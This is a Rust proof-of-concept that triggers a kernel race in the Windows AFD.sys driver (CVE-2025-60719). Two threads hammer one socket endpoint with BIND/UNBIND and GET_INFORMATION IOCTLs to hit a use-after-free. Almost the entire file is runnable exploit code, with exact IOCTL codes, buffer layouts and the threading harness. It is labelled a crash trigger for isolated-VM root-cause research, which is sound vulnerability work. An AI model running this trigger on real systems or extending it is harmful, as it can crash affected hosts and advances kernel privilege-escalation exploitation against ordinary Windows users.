//! CVE-2025-60719 AFD lifetime-race trigger for Windows x64.
//!
//! Root-cause evidence represented by this trigger:
//!
//! - Thread A repeatedly sends `IOCTL_AFD_BIND`/`IOCTL_AFD_UNBIND` on one endpoint.
//! - Thread B concurrently sends `IOCTL_AFD_GET_INFORMATION` with
//!   `AFD_MAX_PATH_SEND_SIZE` (class 5) on the same endpoint.
//! - In the inspected Windows 11 23H2 before image, class 5 loads
//!   `[Endpoint + 0x18]` at `0x1c006bb03` and calls `AfdIssueDeviceControl` at
//!   `0x1c006bb07` without first acquiring the endpoint's unbind barrier.
//! - In the after image's feature-enabled path, `AfdPreventUnbind` at
//!   `0x1c0067d80` and `AfdReallowUnbind` at `0x1c0067df2` bracket that pointer
//!   use (`0x1c0067dd4`/`0x1c0067dd8`).
//!
//! This is a crash/race trigger, not an information-leak or SYSTEM exploit. A
//! root-cause claim still needs a kernel dump showing the vulnerable call path,
//! the stale/freed object, and a before/after comparison. Run only in an
//! isolated, revertible VM: an affected host may bugcheck.
//! The source PoC's outstanding CONNECT IRP is disabled by default because it
//! creates a third concurrent kernel operation; set
//! `CVE_2025_60719_ENABLE_CONNECT=1` only for source-compatibility experiments.
//!
//! Sources:
//! - https://www.huntandhackett.com/blog/improving_afd_socket_visibility
//! - https://leftarcode.com/posts/afd-reverse-engineering-part4/
//! - https://github.com/killvxk/CVE-2024-38193-Nephster/blob/main/Poc/poc.cpp
//! - https://github.com/akamai/CVE-2025-60719-AFD.SYS/blob/main/poc.py

#[cfg(not(all(windows, target_pointer_width = "64")))]
compile_error!("CVE-2025-60719 AFD trigger supports only 64-bit Windows targets");

use core::ffi::c_void;
use std::cell::UnsafeCell;
use std::collections::BTreeMap;
use std::env;
use std::fmt;
use std::io::{self, Write};
use std::mem::{forget, size_of};
use std::net::Ipv4Addr;
use std::ptr::{addr_of, null, null_mut, read_volatile};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;

use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, NTSTATUS, STATUS_INVALID_DEVICE_STATE, STATUS_NOT_FOUND,
    STATUS_PENDING, UNICODE_STRING, WAIT_FAILED, WAIT_OBJECT_0, WAIT_TIMEOUT,
};
use windows_sys::Win32::System::IO::{IO_STATUS_BLOCK, IO_STATUS_BLOCK_0, PIO_APC_ROUTINE};
use windows_sys::Win32::System::Threading::{
    CreateEventW, INFINITE, ResetEvent, WaitForSingleObject,
};

const AFD_DEVICE_NAME: &str = r"\Device\Afd\Endpoint";
const TRANSPORT_NAME: &str = r"\Device\Tcp";

const IOCTL_AFD_BIND: u32 = 0x12003;
const IOCTL_AFD_CONNECT: u32 = 0x12007;
const IOCTL_AFD_GET_INFORMATION: u32 = 0x1207b;
const IOCTL_AFD_UNBIND: u32 = 0x12113;

const AFD_MAX_PATH_SEND_SIZE: u32 = 5;
const AF_INET: i32 = 2;
const SOCK_STREAM: u32 = 1;
const IPPROTO_TCP: i32 = 6;

const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const FILE_OPEN_IF: u32 = 3;
const AFD_ENDPOINT_ACCESS: u32 = 0xc014_0000;
const FILE_SHARE_READ_WRITE: u32 = 3;
const AFD_ENDPOINT_FLAGS: u32 = 0x100;

const EA_NAME: &[u8; 16] = b"AfdOpenPacketXX\0";
const AFD_OPEN_PACKET_SIZE: usize = 52;
const AFD_EA_SIZE: usize = 76;
const BIND_BUFFER_SIZE: usize = 0x1000;
const GET_INFORMATION_INPUT_SIZE: usize = 24;
const GET_INFORMATION_OUTPUT_SIZE: usize = 16;
const CONNECT_INPUT_SIZE: usize = 46;

const DEFAULT_RACE_ITERATIONS: u64 = 1_000_000;
const ITERATIONS_ENV: &str = "CVE_2025_60719_ITERATIONS";
const ENABLE_CONNECT_ENV: &str = "CVE_2025_60719_ENABLE_CONNECT";

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: HANDLE,
    object_name: *const UNICODE_STRING,
    attributes: u32,
    security_descriptor: *const c_void,
    security_quality_of_service: *const c_void,
}

#[repr(C)]
struct AfdUnbindInfo {
    address_family: i32,
    protocol: i32,
}

const _: () = assert!(size_of::<IO_STATUS_BLOCK>() == 16);
const _: () = assert!(size_of::<ObjectAttributes>() == 48);
const _: () = assert!(size_of::<AfdUnbindInfo>() == 8);

#[link(name = "ntdll")]
unsafe extern "system" {
    #[link_name = "NtCreateFile"]
    fn nt_create_file(
        file_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *const ObjectAttributes,
        io_status_block: *mut IO_STATUS_BLOCK,
        allocation_size: *const i64,
        file_attributes: u32,
        share_access: u32,
        create_disposition: u32,
        create_options: u32,
        ea_buffer: *const c_void,
        ea_length: u32,
    ) -> NTSTATUS;

    #[link_name = "NtDeviceIoControlFile"]
    fn nt_device_io_control_file(
        file_handle: HANDLE,
        event: HANDLE,
        apc_routine: PIO_APC_ROUTINE,
        apc_context: *const c_void,
        io_status_block: *mut IO_STATUS_BLOCK,
        io_control_code: u32,
        input_buffer: *const c_void,
        input_buffer_length: u32,
        output_buffer: *mut c_void,
        output_buffer_length: u32,
    ) -> NTSTATUS;

    #[link_name = "NtCancelIoFileEx"]
    fn nt_cancel_io_file_ex(
        file_handle: HANDLE,
        io_request_to_cancel: *const IO_STATUS_BLOCK,
        io_status_block: *mut IO_STATUS_BLOCK,
    ) -> NTSTATUS;
}

#[derive(Debug)]
enum PocError {
    Configuration(String),
    Native(&'static str, NTSTATUS),
    Win32(&'static str, u32),
    Wait(&'static str, u32),
    Io(&'static str, io::Error),
    ThreadSpawn(&'static str, io::Error),
    ThreadPanic(&'static str),
    NullHandle(&'static str),
}

impl fmt::Display for PocError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Configuration(message) => write!(formatter, "{message}"),
            Self::Native(operation, status) => {
                write!(formatter, "{operation} failed: 0x{:08X}", *status as u32)
            }
            Self::Win32(operation, error) => {
                write!(formatter, "{operation} failed: Win32 error {error}")
            }
            Self::Wait(operation, result) => {
                write!(formatter, "{operation} returned wait result 0x{result:08X}")
            }
            Self::Io(operation, error) => write!(formatter, "{operation} failed: {error}"),
            Self::ThreadSpawn(name, error) => {
                write!(formatter, "failed to spawn {name}: {error}")
            }
            Self::ThreadPanic(name) => write!(formatter, "{name} panicked"),
            Self::NullHandle(operation) => {
                write!(
                    formatter,
                    "{operation} succeeded without returning a handle"
                )
            }
        }
    }
}

impl std::error::Error for PocError {}

struct OwnedHandle(HANDLE);

impl OwnedHandle {
    fn from_raw(handle: HANDLE, operation: &'static str) -> Result<Self, PocError> {
        if handle.is_null() {
            Err(PocError::NullHandle(operation))
        } else {
            Ok(Self(handle))
        }
    }

    fn as_raw(&self) -> HANDLE {
        self.0
    }
}

impl Drop for OwnedHandle {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe {
                CloseHandle(self.0);
            }
            self.0 = null_mut();
        }
    }
}

struct IoEvent(OwnedHandle);

impl IoEvent {
    fn new() -> Result<Self, PocError> {
        let handle = unsafe { CreateEventW(null(), 0, 0, null()) };
        OwnedHandle::from_raw(handle, "CreateEventW")
            .map(Self)
            .map_err(|error| match error {
                PocError::NullHandle(_) => {
                    PocError::Win32("CreateEventW", unsafe { GetLastError() })
                }
                other => other,
            })
    }

    fn as_raw(&self) -> HANDLE {
        self.0.as_raw()
    }

    fn reset(&self) -> Result<(), PocError> {
        if unsafe { ResetEvent(self.as_raw()) } == 0 {
            Err(PocError::Win32("ResetEvent", unsafe { GetLastError() }))
        } else {
            Ok(())
        }
    }
}

#[derive(Clone, Copy, Debug)]
struct IoCompletion {
    submit_status: NTSTATUS,
    final_status: NTSTATUS,
    information: usize,
}

#[derive(Default)]
struct OperationStats {
    calls: u64,
    pending_submissions: u64,
    last_information: usize,
    statuses: BTreeMap<u32, u64>,
}

impl OperationStats {
    fn record(&mut self, completion: IoCompletion) {
        self.calls += 1;
        self.pending_submissions += u64::from(completion.submit_status == STATUS_PENDING);
        self.last_information = completion.information;
        *self
            .statuses
            .entry(completion.final_status as u32)
            .or_default() += 1;
    }
}

#[derive(Default)]
struct BindUnbindOutcome {
    bind: OperationStats,
    unbind: OperationStats,
    error: Option<PocError>,
}

#[derive(Default)]
struct GetInformationOutcome {
    get_information: OperationStats,
    error: Option<PocError>,
}

struct RaceStats {
    bind_unbind: BindUnbindOutcome,
    get_information: GetInformationOutcome,
}

fn fresh_iosb() -> IO_STATUS_BLOCK {
    IO_STATUS_BLOCK {
        Anonymous: IO_STATUS_BLOCK_0 {
            Status: STATUS_PENDING,
        },
        Information: 0,
    }
}

fn iosb_status(iosb: &IO_STATUS_BLOCK) -> NTSTATUS {
    unsafe { read_volatile(addr_of!(iosb.Anonymous.Status)) }
}

fn iosb_status_ptr(iosb: *const IO_STATUS_BLOCK) -> NTSTATUS {
    unsafe { read_volatile(addr_of!((*iosb).Anonymous.Status)) }
}

fn iosb_information_ptr(iosb: *const IO_STATUS_BLOCK) -> usize {
    unsafe { read_volatile(addr_of!((*iosb).Information)) }
}

fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

fn wait_for_event(event: HANDLE, timeout: u32, operation: &'static str) -> Result<u32, PocError> {
    let wait_result = unsafe { WaitForSingleObject(event, timeout) };
    if wait_result == WAIT_FAILED {
        Err(PocError::Win32(operation, unsafe { GetLastError() }))
    } else {
        Ok(wait_result)
    }
}

fn wait_for_required_completion(event: HANDLE, operation: &'static str) {
    let wait_result = unsafe { WaitForSingleObject(event, INFINITE) };
    if wait_result != WAIT_OBJECT_0 {
        let win32_error = if wait_result == WAIT_FAILED {
            unsafe { GetLastError() }
        } else {
            0
        };
        eprintln!(
            "[-] {operation} could not prove pending-I/O completion: wait=0x{wait_result:08X}, Win32={win32_error}. Aborting before METHOD_NEITHER buffers can be released."
        );
        std::process::abort();
    }
}

fn issue_ioctl(
    handle: HANDLE,
    event: &IoEvent,
    io_control_code: u32,
    input_buffer: *const c_void,
    input_buffer_length: u32,
    output_buffer: *mut c_void,
    output_buffer_length: u32,
) -> Result<IoCompletion, PocError> {
    event.reset()?;

    let mut iosb = fresh_iosb();
    let submit_status = unsafe {
        nt_device_io_control_file(
            handle,
            event.as_raw(),
            None,
            null(),
            &mut iosb,
            io_control_code,
            input_buffer,
            input_buffer_length,
            output_buffer,
            output_buffer_length,
        )
    };

    let final_status = if submit_status == STATUS_PENDING {
        wait_for_required_completion(event.as_raw(), "WaitForSingleObject(IOCTL)");
        iosb_status(&iosb)
    } else {
        submit_status
    };

    Ok(IoCompletion {
        submit_status,
        final_status,
        information: iosb.Information,
    })
}

fn put_u16(buffer: &mut [u8], offset: usize, value: u16) {
    buffer[offset..offset + size_of::<u16>()].copy_from_slice(&value.to_le_bytes());
}

fn put_u32(buffer: &mut [u8], offset: usize, value: u32) {
    buffer[offset..offset + size_of::<u32>()].copy_from_slice(&value.to_le_bytes());
}

fn build_afd_ea() -> [u8; AFD_EA_SIZE] {
    let mut ea = [0u8; AFD_EA_SIZE];

    // FILE_FULL_EA_INFORMATION header followed by "AfdOpenPacketXX\0".
    ea[4] = 0;
    ea[5] = (EA_NAME.len() - 1) as u8;
    put_u16(&mut ea, 6, AFD_OPEN_PACKET_SIZE as u16);
    ea[8..24].copy_from_slice(EA_NAME);

    // Public PoC AFD_OPEN_PACKET value (52 bytes, including its six-byte zero tail).
    put_u32(&mut ea, 24, AFD_ENDPOINT_FLAGS);
    put_u32(&mut ea, 28, 0);
    put_u32(&mut ea, 32, AF_INET as u32);
    put_u32(&mut ea, 36, SOCK_STREAM);
    put_u32(&mut ea, 40, IPPROTO_TCP as u32);
    put_u32(
        &mut ea,
        44,
        (TRANSPORT_NAME.encode_utf16().count() * 2) as u32,
    );

    for (index, code_unit) in TRANSPORT_NAME.encode_utf16().enumerate() {
        put_u16(&mut ea, 48 + index * 2, code_unit);
    }

    ea
}

fn create_afd_endpoint() -> Result<OwnedHandle, PocError> {
    let ea = build_afd_ea();
    let mut device_name: Vec<u16> = AFD_DEVICE_NAME.encode_utf16().chain([0]).collect();
    let string_byte_length = (device_name.len() - 1) * size_of::<u16>();
    let maximum_byte_length = device_name.len() * size_of::<u16>();

    let unicode_name = UNICODE_STRING {
        Length: string_byte_length
            .try_into()
            .expect("AFD device name length fits in USHORT"),
        MaximumLength: maximum_byte_length
            .try_into()
            .expect("AFD device name length fits in USHORT"),
        Buffer: device_name.as_mut_ptr(),
    };

    let object_attributes = ObjectAttributes {
        length: size_of::<ObjectAttributes>() as u32,
        root_directory: null_mut(),
        object_name: &unicode_name,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: null(),
        security_quality_of_service: null(),
    };

    let mut handle: HANDLE = null_mut();
    let mut iosb = fresh_iosb();
    let submit_status = unsafe {
        nt_create_file(
            &mut handle,
            AFD_ENDPOINT_ACCESS,
            &object_attributes,
            &mut iosb,
            null(),
            0,
            FILE_SHARE_READ_WRITE,
            FILE_OPEN_IF,
            0,
            ea.as_ptr().cast(),
            ea.len() as u32,
        )
    };

    let final_status = if submit_status == STATUS_PENDING {
        if handle.is_null() {
            eprintln!(
                "[-] NtCreateFile returned STATUS_PENDING without a waitable handle. Aborting before its EA/IOSB storage can be released."
            );
            std::process::abort();
        }
        wait_for_required_completion(handle, "WaitForSingleObject(NtCreateFile)");
        iosb_status(&iosb)
    } else {
        submit_status
    };

    if !nt_success(final_status) {
        if !handle.is_null() {
            unsafe {
                CloseHandle(handle);
            }
        }
        return Err(PocError::Native("NtCreateFile", final_status));
    }

    OwnedHandle::from_raw(handle, "NtCreateFile")
}

fn afd_bind(handle: HANDLE, event: &IoEvent) -> Result<IoCompletion, PocError> {
    let mut input = [0u8; BIND_BUFFER_SIZE];
    let mut output = [0u8; BIND_BUFFER_SIZE];

    // AFD_BIND_INFO { ShareAccess, TRANSPORT_ADDRESS }. The public trigger uses
    // AddressLength=16 even though the IPv4 TDI payload itself is 14 bytes; keep
    // that source-specific value so this remains a causal translation.
    put_u32(&mut input, 4, 1);
    put_u16(&mut input, 8, 16);
    put_u16(&mut input, 10, AF_INET as u16);
    input[14..18].copy_from_slice(&Ipv4Addr::LOCALHOST.octets());

    issue_ioctl(
        handle,
        event,
        IOCTL_AFD_BIND,
        input.as_ptr().cast(),
        input.len() as u32,
        output.as_mut_ptr().cast(),
        output.len() as u32,
    )
}

fn afd_unbind(handle: HANDLE, event: &IoEvent) -> Result<IoCompletion, PocError> {
    let input = AfdUnbindInfo {
        address_family: AF_INET,
        protocol: IPPROTO_TCP,
    };

    issue_ioctl(
        handle,
        event,
        IOCTL_AFD_UNBIND,
        (&input as *const AfdUnbindInfo).cast(),
        size_of::<AfdUnbindInfo>() as u32,
        null_mut(),
        0,
    )
}

fn afd_get_information(handle: HANDLE, event: &IoEvent) -> Result<IoCompletion, PocError> {
    // PHNT's canonical x64 AFD_INFORMATION is 16 bytes. The source Python PoC
    // sends a naturally aligned ULONG + ULONGLONG + ULONG structure (24 bytes).
    // Preserve those exact input bytes while using the correct 16-byte IOSB ABI.
    let mut input = [0u8; GET_INFORMATION_INPUT_SIZE];
    let mut output = [0u8; GET_INFORMATION_OUTPUT_SIZE];
    put_u32(&mut input, 0, AFD_MAX_PATH_SEND_SIZE);

    issue_ioctl(
        handle,
        event,
        IOCTL_AFD_GET_INFORMATION,
        input.as_ptr().cast(),
        input.len() as u32,
        output.as_mut_ptr().cast(),
        output.len() as u32,
    )
}

fn build_connect_input(ip: Ipv4Addr, port: u16) -> [u8; CONNECT_INPUT_SIZE] {
    let mut input = [0u8; CONNECT_INPUT_SIZE];

    // x64 AFD_CONNECT_JOIN_INFO: SanActive + alignment + two zero handles,
    // followed by TRANSPORT_ADDRESS at offset 24.
    put_u32(&mut input, 24, 1);
    put_u16(&mut input, 28, 14);
    put_u16(&mut input, 30, AF_INET as u16);
    input[32..34].copy_from_slice(&port.to_be_bytes());
    input[34..38].copy_from_slice(&ip.octets());

    input
}

enum ConnectSubmission {
    Complete(IoCompletion),
    Pending(PendingConnect),
}

struct PendingConnect {
    endpoint: usize,
    event: Option<IoEvent>,
    iosb: Option<Box<UnsafeCell<IO_STATUS_BLOCK>>>,
    _input: Option<Box<[u8; CONNECT_INPUT_SIZE]>>,
    finished: bool,
}

impl PendingConnect {
    fn event_raw(&self) -> HANDLE {
        self.event
            .as_ref()
            .expect("pending connect owns its event")
            .as_raw()
    }

    fn iosb_ptr(&self) -> *mut IO_STATUS_BLOCK {
        self.iosb
            .as_ref()
            .expect("pending connect owns its IOSB")
            .get()
    }

    fn observe(&mut self, timeout: u32) -> Result<Option<IoCompletion>, PocError> {
        let wait_result = wait_for_event(
            self.event_raw(),
            timeout,
            "WaitForSingleObject(pending connect)",
        )?;

        match wait_result {
            WAIT_OBJECT_0 => {
                self.finished = true;
                let iosb = self.iosb_ptr();
                Ok(Some(IoCompletion {
                    submit_status: STATUS_PENDING,
                    final_status: iosb_status_ptr(iosb),
                    information: iosb_information_ptr(iosb),
                }))
            }
            WAIT_TIMEOUT => Ok(None),
            other => Err(PocError::Wait(
                "WaitForSingleObject(pending connect)",
                other,
            )),
        }
    }

    fn request_cancel(&self) -> NTSTATUS {
        let mut cancel_iosb = fresh_iosb();
        unsafe { nt_cancel_io_file_ex(self.endpoint as HANDLE, self.iosb_ptr(), &mut cancel_iosb) }
    }

    fn finish(mut self) -> Result<IoCompletion, PocError> {
        if let Some(completion) = self.observe(0)? {
            return Ok(completion);
        }

        let cancel_status = self.request_cancel();
        if !nt_success(cancel_status) && cancel_status != STATUS_NOT_FOUND {
            eprintln!(
                "[!] NtCancelIoFileEx(connect): 0x{:08X}; waiting for original completion",
                cancel_status as u32
            );
        }

        self.observe(INFINITE)?.ok_or(PocError::Wait(
            "WaitForSingleObject(pending connect)",
            WAIT_TIMEOUT,
        ))
    }

    fn leak_owned_state(&mut self) {
        if let Some(event) = self.event.take() {
            forget(event);
        }
        if let Some(iosb) = self.iosb.take() {
            forget(iosb);
        }
        if let Some(input) = self._input.take() {
            forget(input);
        }
    }
}

impl Drop for PendingConnect {
    fn drop(&mut self) {
        if self.finished || self.event.is_none() || self.iosb.is_none() {
            return;
        }

        let _ = self.request_cancel();
        let wait_result = unsafe { WaitForSingleObject(self.event_raw(), INFINITE) };
        if wait_result == WAIT_OBJECT_0 {
            self.finished = true;
        } else {
            // METHOD_NEITHER pointers must not be freed while the request can
            // still reference them. Leak on an unrecoverable wait failure; the
            // process/OS will reclaim the state at termination.
            self.leak_owned_state();
        }
    }
}

fn submit_connect(handle: HANDLE, ip: Ipv4Addr, port: u16) -> Result<ConnectSubmission, PocError> {
    let event = IoEvent::new()?;
    let input = Box::new(build_connect_input(ip, port));
    let iosb = Box::new(UnsafeCell::new(fresh_iosb()));

    let submit_status = unsafe {
        nt_device_io_control_file(
            handle,
            event.as_raw(),
            None,
            null(),
            iosb.get(),
            IOCTL_AFD_CONNECT,
            input.as_ptr().cast(),
            input.len() as u32,
            null_mut(),
            0,
        )
    };

    if submit_status == STATUS_PENDING {
        Ok(ConnectSubmission::Pending(PendingConnect {
            endpoint: handle as usize,
            event: Some(event),
            iosb: Some(iosb),
            _input: Some(input),
            finished: false,
        }))
    } else {
        Ok(ConnectSubmission::Complete(IoCompletion {
            submit_status,
            final_status: submit_status,
            information: iosb_information_ptr(iosb.get()),
        }))
    }
}

fn wait_until_started(start: &AtomicBool, stop: &AtomicBool) -> bool {
    while !start.load(Ordering::Acquire) {
        if stop.load(Ordering::Relaxed) {
            return false;
        }
        thread::yield_now();
    }
    !stop.load(Ordering::Relaxed)
}

fn bind_unbind_worker(
    endpoint: usize,
    iterations: u64,
    start: Arc<AtomicBool>,
    stop: Arc<AtomicBool>,
) -> BindUnbindOutcome {
    let mut outcome = BindUnbindOutcome::default();
    let event = match IoEvent::new() {
        Ok(event) => event,
        Err(error) => {
            stop.store(true, Ordering::Release);
            outcome.error = Some(error);
            return outcome;
        }
    };

    if !wait_until_started(&start, &stop) {
        return outcome;
    }

    let handle = endpoint as HANDLE;
    for _ in 0..iterations {
        if stop.load(Ordering::Relaxed) {
            break;
        }

        match afd_bind(handle, &event) {
            Ok(completion) => outcome.bind.record(completion),
            Err(error) => {
                stop.store(true, Ordering::Release);
                outcome.error = Some(error);
                break;
            }
        }

        match afd_unbind(handle, &event) {
            Ok(completion) => outcome.unbind.record(completion),
            Err(error) => {
                stop.store(true, Ordering::Release);
                outcome.error = Some(error);
                break;
            }
        }
    }

    outcome
}

fn get_information_worker(
    endpoint: usize,
    iterations: u64,
    start: Arc<AtomicBool>,
    stop: Arc<AtomicBool>,
) -> GetInformationOutcome {
    let mut outcome = GetInformationOutcome::default();
    let event = match IoEvent::new() {
        Ok(event) => event,
        Err(error) => {
            stop.store(true, Ordering::Release);
            outcome.error = Some(error);
            return outcome;
        }
    };

    if !wait_until_started(&start, &stop) {
        return outcome;
    }

    let handle = endpoint as HANDLE;
    for _ in 0..iterations {
        if stop.load(Ordering::Relaxed) {
            break;
        }

        match afd_get_information(handle, &event) {
            Ok(completion) => outcome.get_information.record(completion),
            Err(error) => {
                stop.store(true, Ordering::Release);
                outcome.error = Some(error);
                break;
            }
        }
    }

    outcome
}

fn run_race(handle: HANDLE, iterations: u64) -> Result<RaceStats, PocError> {
    let endpoint = handle as usize;
    let start = Arc::new(AtomicBool::new(false));
    let stop = Arc::new(AtomicBool::new(false));

    let bind_start = Arc::clone(&start);
    let bind_stop = Arc::clone(&stop);
    let bind_thread = thread::Builder::new()
        .name("afd-bind-unbind".to_owned())
        .spawn(move || bind_unbind_worker(endpoint, iterations, bind_start, bind_stop))
        .map_err(|error| PocError::ThreadSpawn("afd-bind-unbind", error))?;

    let info_start = Arc::clone(&start);
    let info_stop = Arc::clone(&stop);
    let info_thread = match thread::Builder::new()
        .name("afd-get-information".to_owned())
        .spawn(move || get_information_worker(endpoint, iterations, info_start, info_stop))
    {
        Ok(handle) => handle,
        Err(error) => {
            stop.store(true, Ordering::Release);
            start.store(true, Ordering::Release);
            let _ = bind_thread.join();
            return Err(PocError::ThreadSpawn("afd-get-information", error));
        }
    };

    start.store(true, Ordering::Release);

    let bind_result = bind_thread.join();
    stop.store(true, Ordering::Release);
    let info_result = info_thread.join();

    // Never detach one worker because the other panicked: the shared endpoint
    // must remain open until both threads have definitely stopped using it.
    let bind_unbind = bind_result.map_err(|_| PocError::ThreadPanic("afd-bind-unbind"))?;
    let get_information = info_result.map_err(|_| PocError::ThreadPanic("afd-get-information"))?;

    Ok(RaceStats {
        bind_unbind,
        get_information,
    })
}

fn configured_iterations() -> Result<u64, PocError> {
    let Ok(value) = env::var(ITERATIONS_ENV) else {
        return Ok(DEFAULT_RACE_ITERATIONS);
    };

    let iterations = value.parse::<u64>().map_err(|error| {
        PocError::Configuration(format!(
            "{ITERATIONS_ENV} must be a positive u64, got {value:?}: {error}"
        ))
    })?;

    if iterations == 0 {
        Err(PocError::Configuration(format!(
            "{ITERATIONS_ENV} must be greater than zero"
        )))
    } else {
        Ok(iterations)
    }
}

fn connect_compatibility_enabled() -> Result<bool, PocError> {
    let Ok(value) = env::var(ENABLE_CONNECT_ENV) else {
        return Ok(false);
    };

    match value.to_ascii_lowercase().as_str() {
        "1" | "true" | "yes" | "on" => Ok(true),
        "0" | "false" | "no" | "off" => Ok(false),
        _ => Err(PocError::Configuration(format!(
            "{ENABLE_CONNECT_ENV} must be 0/1 or false/true, got {value:?}"
        ))),
    }
}

fn print_completion(label: &str, completion: IoCompletion) {
    let prefix = if nt_success(completion.final_status) {
        "[+]"
    } else {
        "[-]"
    };
    let pending = if completion.submit_status == STATUS_PENDING {
        " (submitted STATUS_PENDING, completion awaited)"
    } else {
        ""
    };
    println!(
        "{prefix} {label}: final=0x{:08X}, information=0x{:X}{pending}",
        completion.final_status as u32, completion.information
    );
}

fn require_success(label: &'static str, completion: IoCompletion) -> Result<(), PocError> {
    print_completion(label, completion);
    if nt_success(completion.final_status) {
        Ok(())
    } else {
        Err(PocError::Native(label, completion.final_status))
    }
}

fn print_stats(label: &str, stats: &OperationStats) {
    println!(
        "[*] {label}: calls={}, pending_submissions={}, last_information=0x{:X}",
        stats.calls, stats.pending_submissions, stats.last_information
    );
    for (status, count) in &stats.statuses {
        println!("    0x{status:08X}: {count}");
    }
}

fn print_race_stats(stats: &RaceStats) {
    println!("[*] Race status histogram (final IOSB statuses):");
    print_stats("AFD_BIND", &stats.bind_unbind.bind);
    print_stats("AFD_UNBIND", &stats.bind_unbind.unbind);
    print_stats(
        "AFD_GET_INFORMATION(class 5)",
        &stats.get_information.get_information,
    );

    let barrier_rejections = stats
        .bind_unbind
        .bind
        .statuses
        .get(&(STATUS_INVALID_DEVICE_STATE as u32))
        .copied()
        .unwrap_or(0)
        + stats
            .bind_unbind
            .unbind
            .statuses
            .get(&(STATUS_INVALID_DEVICE_STATE as u32))
            .copied()
            .unwrap_or(0)
        + stats
            .get_information
            .get_information
            .statuses
            .get(&(STATUS_INVALID_DEVICE_STATE as u32))
            .copied()
            .unwrap_or(0);

    println!(
        "[*] STATUS_INVALID_DEVICE_STATE (0x{:08X}) observations: {barrier_rejections}",
        STATUS_INVALID_DEVICE_STATE as u32
    );
}

fn wait_for_confirmation() -> Result<(), PocError> {
    print!(
        "[*] This may bugcheck an affected Windows kernel. Press Enter only inside an isolated VM..."
    );
    io::stdout()
        .flush()
        .map_err(|error| PocError::Io("stdout flush", error))?;

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .map_err(|error| PocError::Io("stdin read", error))?;
    Ok(())
}

fn run() -> Result<(), PocError> {
    println!("[*] Starting CVE-2025-60719 AFD root-cause race trigger...");
    println!(
        "[*] IO_STATUS_BLOCK={} bytes, OBJECT_ATTRIBUTES={} bytes",
        size_of::<IO_STATUS_BLOCK>(),
        size_of::<ObjectAttributes>()
    );

    let iterations = configured_iterations()?;
    println!("[*] Race limit: {iterations} iterations per worker ({ITERATIONS_ENV})");
    let enable_connect = connect_compatibility_enabled()?;

    let endpoint = create_afd_endpoint()?;
    println!("[+] Initial AFD endpoint: {:p}", endpoint.as_raw());

    let setup_event = IoEvent::new()?;
    require_success(
        "initial AFD_BIND",
        afd_bind(endpoint.as_raw(), &setup_event)?,
    )?;
    require_success(
        "initial AFD_GET_INFORMATION(class 5)",
        afd_get_information(endpoint.as_raw(), &setup_event)?,
    )?;
    require_success(
        "initial AFD_UNBIND",
        afd_unbind(endpoint.as_raw(), &setup_event)?,
    )?;
    require_success("rebind", afd_bind(endpoint.as_raw(), &setup_event)?)?;

    let mut pending_connect = None;
    if enable_connect {
        println!(
            "[!] {ENABLE_CONNECT_ENV}=1: enabling the source-compatible CONNECT setup; a pending CONNECT is a third concurrent IRP and weakens causal isolation"
        );
        pending_connect = match submit_connect(endpoint.as_raw(), Ipv4Addr::LOCALHOST, 4444)? {
            ConnectSubmission::Complete(completion) => {
                print_completion("AFD_CONNECT", completion);
                None
            }
            ConnectSubmission::Pending(pending) => {
                println!(
                    "[+] AFD_CONNECT submitted STATUS_PENDING; its event, IOSB, and METHOD_NEITHER input remain pinned through the race"
                );
                Some(pending)
            }
        };
    } else {
        println!(
            "[*] AFD_CONNECT skipped for the primary two-operation race; set {ENABLE_CONNECT_ENV}=1 to reproduce the source setup"
        );
    }

    wait_for_confirmation()?;
    println!("[*] Launching BIND/UNBIND vs GET_INFORMATION(class 5)...");
    let race_stats = run_race(endpoint.as_raw(), iterations)?;
    print_race_stats(&race_stats);

    if let Some(pending) = pending_connect.take() {
        print_completion("AFD_CONNECT completion", pending.finish()?);
    }

    if let Some(error) = race_stats.bind_unbind.error {
        return Err(error);
    }
    if let Some(error) = race_stats.get_information.error {
        return Err(error);
    }

    println!(
        "[*] Trigger finished without a captured kernel crash. Status repetition alone does not prove a stale/free event or LPE."
    );
    println!(
        "[*] For root-cause evidence, collect the vulnerable-build dump and verify AfdGetInformation -> AfdIssueDeviceControl -> IoGetRelatedDeviceObject, then compare the patched barrier path."
    );
    Ok(())
}

pub fn run_poc() {
    if let Err(error) = run() {
        eprintln!("[-] CVE-2025-60719 trigger failed: {error}");
    }
}
